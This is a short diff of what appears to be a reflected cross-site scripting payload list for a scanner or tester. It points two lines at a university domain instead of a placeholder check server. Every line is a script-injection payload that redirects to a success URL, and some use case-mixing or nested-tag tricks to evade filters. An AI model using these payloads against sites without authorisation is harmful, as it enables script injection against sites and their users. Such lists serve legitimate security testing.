@@ -1,5 +1,5 @@
-<script>location.href="http://check_server/Reflected_XSS_Success"</script>
-<sCrIpT>lOcAtIoN.hReF="http://check_server/Reflected_XSS_Success"</sCrIpT>
+<script>location.href="http://cuha.cju.ac.kr/reflected-xss-success"</script>
+<sCrIpT>lOcAtIoN.hReF="http://cuha.cju.ac.kr/reflected_xss_success"</sCrIpT>
 <scrscriptipt>location.href="http://check_server/Reflected_XSS_Success"</scrscriptipt>
 <sCrScRiPtIpT>lOcAtIoN.hReF="http://check_server/Reflected_XSS_Success"</sCrScRiPtIpT>
 <a href="http://check_server/Reflected_XSS_Success"></a>
